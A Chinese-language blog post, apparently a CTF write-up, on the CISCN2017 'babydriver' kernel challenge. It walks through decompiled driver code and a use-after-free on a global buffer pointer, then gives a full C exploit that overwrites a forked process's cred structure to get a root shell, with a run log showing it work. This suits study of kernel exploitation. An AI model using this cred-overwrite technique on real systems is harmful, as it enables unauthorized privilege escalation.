---
layout: post
title:  "Kernel UAF"
date:   2020-3-6
desc: ""
keywords: ""
categories: [Binary]
tags: []
icon: icon-html
---

# Kernel UAF

> 👴的第一道kernel pwn

Kernel UAF和glibc heap uaf差不多一个意思，指针没清除，释放之后还能继续用

经常出现在多线程多进程多文件的情况

## CISCN2017 babydriver

boot.sh

```bash
#!/bin/bash

qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s

```

解压rootfs.cpio

```bash
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

babydriver.ko

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

只开了NX

babydriver_init

```c
int __cdecl babydriver_init()
{
  __int64 v0; // rdx
  int v1; // edx
  __int64 v2; // rsi
  __int64 v3; // rdx
  int v4; // ebx
  class *v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rax

  if ( alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )
  {
    cdev_init(&cdev_0, &fops);
    v2 = babydev_no;
    cdev_0.owner = &_this_module;
    v4 = cdev_add(&cdev_0, babydev_no, 1LL);
    if ( v4 >= 0 )
    {
      v5 = _class_create(&_this_module, "babydev", &babydev_no);
      babydev_class = v5;
      if ( v5 )
      {
        v7 = device_create(v5, 0LL, babydev_no, 0LL, "babydev");
        v1 = 0;
        if ( v7 )
          return v1;
        printk(&unk_351, 0LL, 0LL);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B, "babydev", v6);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327, v2, v3);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v4;
  }
  printk(&unk_309, 0LL, v0);
  return 1;
}
```

/dev/babydev 设备初始化



babyioctl

```c
// local variable allocation has failed, the output may be wrong!
__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx
  __int64 v5; // rdx
  __int64 result; // rax

  _fentry__(filp, *&command, arg);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = _kmalloc(v4, 0x24000C0LL);
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n", 0x24000C0LL, v5);
    result = 0LL;
  }
  else
  {
    printk(&unk_2EB, v3, v3);
    result = -22LL;
  }
  return result;
}
```

定义命令0x10001

释放buf再根据传入的size申请，并设置size



babyread

```c
ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer, length);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);
    result = v6;
  }
  return result;
}
```

length不大于size时，从内核空间复制数据到用户空间



babywrite

```c
ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer, length);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();
    result = v6;
  }
  return result;
}
```

length不大于size时，从用户空间复制数据到内核空间



babyrelease

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  __int64 v2; // rdx
  __int64 v3; // rdx

  _fentry__(inode, filp, v2);
  kfree(babydev_struct.device_buf);
  printk("device release\n", filp, v3);
  return 0;
}
```

关闭文件描述符时释放buf，但是指针未清除，babydev_struct.device_buf是全局变量，如果开了两个文件描述符，就可以UAF

1. 开两个文件描述符fd1,fd2
2. ioctl申请一个与cred结构体大小相同的空间，内核版本4.4.72，cred大小为0xa8
3. 关闭fd1，刚才申请的空间被释放，指针未清除，可以通过fd2控制
4. fork新进程，cred申请到刚释放的空间
5. 写fd2，把uid gid改为0

exp

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);

	ioctl(fd1, 0x10001, 0xa8);
	close(fd1);

	int pid = fork();
	if(pid < 0)
	{
		puts("[*] fork error!");
		exit(0);
	}

	else if(pid == 0)
	{
		char zeros[30] = {0};
		write(fd2, zeros, 28);

		if(getuid() == 0)
		{
			puts("[+] root now.");
			system("/bin/sh");
			exit(0);
		}
	}
	
	else
	{
		wait(NULL);
	}
	close(fd2);

	return 0;
}

```

fuck.sh

```bash
#!/bin/bash
gcc -static exp.c -o rootfs/exp
cd rootfs
find . | cpio -o --format=newc > ../rootfs.cpio
cd ..
./boot.sh
```

```c
/ $ cat flag
cat: can't open 'flag': Permission denied
/ $ ./exp 
[    8.416595] device open
[    8.417958] device open
[    8.419166] alloc done
[    8.420355] device release
[+] root now.
/ # cat flag
wdnmd
/ # id
uid=0(root) gid=0(root) groups=1000(ctf)
/ # 

```

